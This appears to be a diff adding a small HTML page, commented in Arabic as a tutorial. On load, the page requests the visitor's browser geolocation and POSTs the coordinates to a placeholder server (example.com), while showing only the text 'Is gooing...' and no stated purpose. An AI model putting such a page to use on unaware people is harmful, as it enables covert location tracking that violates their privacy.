@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Location</title>
+    <script>
+        // دالة تقوم بإرسال الموقع الجغرافي إلى خادم (ستتعلم لاحقًا كيفية إعداد الخادم)
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,  // إحداثيات خط العرض
+                longitude: position.coords.longitude // إحداثيات خط الطول
+            };
+
+            // إرسال البيانات إلى خادم باستخدام طريقة POST
+            fetch('https://example.com/api/location', {  // استبدل "example.com" بالخادم الخاص بك لاحقًا
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Done:', data))
+            .catch((error) => console.error('error:', error));
+        }
+
+        // دالة للحصول على الموقع من المتصفح
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);  // يجلب الموقع ويستدعي دالة الإرسال
+            } else {
+                alert("المتصفح الخاص بك لا يدعم تحديد الموقع.");
+            }
+        }
+
+        // دالة لإظهار الأخطاء إذا لم يتمكن من الحصول على الموقع
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("تم رفض طلب الوصول إلى الموقع.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متاحة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة الحصول على الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()"> <!-- عند تحميل الصفحة يتم استدعاء دالة getLocation -->
+    <h1>Is gooing...</h1>
+</body>
+</html>
